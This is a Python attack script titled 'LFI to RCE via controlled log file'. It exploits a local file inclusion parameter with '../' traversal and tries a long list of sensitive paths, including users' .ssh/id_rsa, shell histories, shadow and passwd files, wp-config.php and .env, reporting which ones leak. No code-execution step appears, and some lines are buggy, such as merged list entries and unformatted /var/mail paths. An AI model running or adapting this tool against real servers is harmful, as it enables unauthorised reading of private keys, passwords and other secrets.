#!python
# LFI to RCE via controlled log file
import requests as req
import time
import sys

import argparse
parser = argparse.ArgumentParser()

DEBUG = False
def check(list_to_test):
    for i in list_to_test:
        if i:
            directory_traversal = '' if len == 0 else '../'*(dir_length-1) + '..'
            payload = {param_name: directory_traversal + i}
            r = req.get(url, params=payload)
            size = len(r.text)
            if DEBUG:
               print(r.status_code)
               print(payload)
               print(r.text)
            if size != bad_size:
               print(i)


parser.add_argument('--url', help='URL without arguments')
parser.add_argument('--param', help='Vulnerable parameter')
parser.add_argument('--bad', help='Bad responce size', type=int, default=0)
parser.add_argument('--len', help='How much "../" needed', type=int, default=0)
parser.add_argument('--usernames', help='List of usernames, whos ~ needs to be checked', default='root')
args = parser.parse_args()
url = args.url
param_name = args.param 
bad_size = args.bad
dir_length = args.len

mlist = []
filepath = '/root/wordlists/common-files.txt'
with open(filepath) as fp:
   for line in fp:
       mlist.append(line[:-1])
check(mlist)

username_list = args.usernames.split(',')
home_files = [
    '.bashrc',
    '.zshrc',
    '.ssh/id_rsa',
    '.bash_history',
    '.zsh_history',
    '.local/share/fish/fish_history',
    'password',
    'password.txt',
    'creds',
    'creds.txt',
    'shadow',
    'shadow.bak',
    'htaccess',
    '.htaccess',
    'wp-config.php,'
    'wp-config,'
    'wp-config.php.bak',

    'secring.skr',
    'secring.pgp',
    'secring.bak',
    'passwd',
    'passwd.bak',
    'master.passwd',
    'pwd.db',
    'htpasswd',
    'htpasswd.bak',
    'htgroup',
    'spwd.db',
    'htpasswd.bak',
    'config.php',
    'phpinfo.php',
    'passlist',
    'passlist.txt',
    'auth_user_file',
    'administrators.pwd',
    'admin.mdb',
    'connect.inc',
    'globals.inc',
    'vtund.conf',
    'password.log',
    'slapd.conf',
    'wvdial.conf',
    '.netrc',
    'wand.dat',
    'mrtg.cfg',
    'zebra.conf',
    'ospfd.conf',
    'ccbill.log',
    'users.mdb',
    'lilo.conf',
    'passwd.txt',
    'main.mdb',
    'sites.ini',
    'wcx_ftp.ini',
    'ws_ftp.ini',
    'flashFXP.ini',
    'serv-u.ini',
    'eudora.ini',
    'unattend.txt',
    'passwd.txt',
    'server.cfg',
    'pass.dat',
    'admin.dat',
    'wp-config.php',
    'wp-config',
    'wp-config.php.bak',
    
    '.DS_Store',
    '.FBCIndex',
    '.access',
    '.addressbook',
    '.cobalt',
    '.fhp',
    '.forward',
    '.history',
    '.htaccess',
    '.htaccess.old',
    '.htaccess.save',
    '.htaccess~',
    '.htpasswd',
    '.lynx_cookies',
    '.mysql_history',
    '.nsconfig',
    '.nsf/../winnt/win.ini',
    '.passwd',
    '.perf',
    '.pinerc',
    '.plan',
    '.proclog',
    '.procmailrc',
    '.profile',
    '.psql_history',
    '.rhosts',
    '.sh_history',
    '.ssh',
    '.ssh/authorized_keys',
    '.ssh/known_hosts',
    '.www_acl'
    '.env'

]
home_list = []
user_files_to_check = []
for username in username_list:
    for _file in home_files:
        home_dir = f'/home/{username}/'
        user_files_to_check.append(home_dir + _file)
    user_files_to_check.append('/var/mail/{username}')
    user_files_to_check.append('/var/mail/spool/{username}')

###
check(user_files_to_check)
